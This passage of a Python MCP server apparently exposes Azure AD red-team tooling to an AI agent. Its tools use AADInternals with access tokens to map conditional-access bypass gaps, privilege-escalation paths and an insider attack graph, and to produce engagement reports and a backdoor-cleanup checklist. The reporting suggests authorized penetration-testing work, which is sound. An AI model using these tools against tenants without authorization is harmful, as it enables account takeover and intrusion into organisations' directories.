    Finds: excluded users, legacy auth gaps, device-only policies, location gaps.

    Args:
        token_alias: Admin or CA reader token
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    result = await bridge.execute("Get-AADIntConditionalAccessPolicies", {"AccessToken": token_val})
    if not result.success:
        return _format_result(result, "analyze_ca")

    policies = result.data if isinstance(result.data, list) else [result.data] if result.data else []
    analysis = analyze_ca_policies(policies)

    try:
        update_attack_surface(token_alias, "CA-Analysis", {
            "policies_analyzed": str(len(policies)),
            "gaps_found": str(len(analysis.get("gaps", []))),
            "bypass_paths": str(len(analysis.get("bypass_paths", []))),
        })
    except Exception:
        pass

    return json.dumps({"policies_count": len(policies), "analysis": analysis}, indent=2)


@mcp.tool()
async def analyze_privesc(token_alias: str) -> str:
    """
    Find privilege escalation paths: abusable groups, over-permissioned apps, orphaned SPs.

    Args:
        token_alias: Token with directory read access
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    safe_token = token_val.replace("'", "''")
    script = f"""
$token = '{safe_token}'
$r = @{{}}
try {{ $r.Users = Get-AADIntUsers -AccessToken $token | Select-Object UserPrincipalName, ObjectId, ImmutableId }} catch {{ }}
try {{ $r.Groups = Get-AADIntGroups -AccessToken $token }} catch {{ }}
try {{ $r.Apps = Get-AADIntServicePrincipals -AccessToken $token }} catch {{ }}
try {{ $r.Roles = Get-AADIntDirectoryRoles -AccessToken $token }} catch {{ }}
$r | ConvertTo-Json -Depth 5 -Compress
"""
    result = await bridge.execute_script(script, timeout=LONG_TIMEOUT)
    if not result.success:
        return _format_result(result, "analyze_privesc")

    paths = find_privesc_paths(result.data if isinstance(result.data, dict) else {})
    try:
        update_attack_surface(token_alias, "PrivEsc-Analysis", {
            "paths_found": str(len(paths)),
        })
    except Exception:
        pass

    return json.dumps({"privesc_paths": paths}, indent=2)


@mcp.tool()
async def analyze_attack_graph(token_alias: str) -> str:
    """
    Build access relationship graph: users -> groups -> apps -> roles -> subscriptions.

    Args:
        token_alias: Token with directory read access
    """
    token_val = tokens.get_value(token_alias)
    if not token_val:
        return json.dumps({"error": f"Token '{token_alias}' not found."})

    result = await bridge.execute("Invoke-AADIntReconAsInsider", {"AccessToken": token_val}, timeout=LONG_TIMEOUT)
    if not result.success:
        return _format_result(result, "analyze_attack_graph")

    graph = build_access_graph(result.data if isinstance(result.data, dict) else {})
    return json.dumps({"graph_summary": {"nodes": len(graph.get("nodes", [])), "edges": len(graph.get("edges", []))}}, indent=2)


# ---------------------------------------------------------------
# PHASE 16: REPORTING AND CLEANUP
# ---------------------------------------------------------------

@mcp.tool()
async def report_generate(engagement: str) -> str:
    """
    Auto-generate full engagement report from all 15 folders.

    Args:
        engagement: Engagement name (domain slug, e.g., 'm-grdz-org')
    """
    report = generate_report(engagement)
    return json.dumps({"status": "success", "report_length": len(report), "preview": report[:3000]})


@mcp.tool()
async def report_mitre_layer(engagement: str) -> str:
    """
    Generate MITRE ATT&CK Navigator layer JSON from engagement playbook.

    Args:
        engagement: Engagement name
    """
    layer = generate_mitre_layer(engagement)
    return json.dumps(layer, indent=2)


@mcp.tool()
async def report_evidence_package(engagement: str) -> str:
    """
    Generate evidence manifest with SHA256 hashes for all engagement files.

    Args:
        engagement: Engagement name
    """
    package = generate_evidence_package(engagement)
    return json.dumps(package, indent=2)


@mcp.tool()
async def report_cleanup(engagement: str) -> str:
    """
    Generate cleanup checklist from persistence inventory.
    Lists all active backdoors needing teardown.

    Args:
        engagement: Engagement name
    """
    checklist = generate_cleanup_checklist(engagement)
    return json.dumps({"checklist": checklist})


@mcp.tool()
async def report_narrative(engagement: str) -> str:
    """
    Generate kill chain narrative from execution log.

    Args:
        engagement: Engagement name
    """
    narrative = generate_kill_chain_narrative(engagement)
    return json.dumps({"narrative": narrative})


# ---------------------------------------------------------------
# ENTRY POINT
# ---------------------------------------------------------------

def main():
    """Run the MCP server via stdio transport."""
    mcp.run(transport="stdio")


if __name__ == "__main__":
    main()
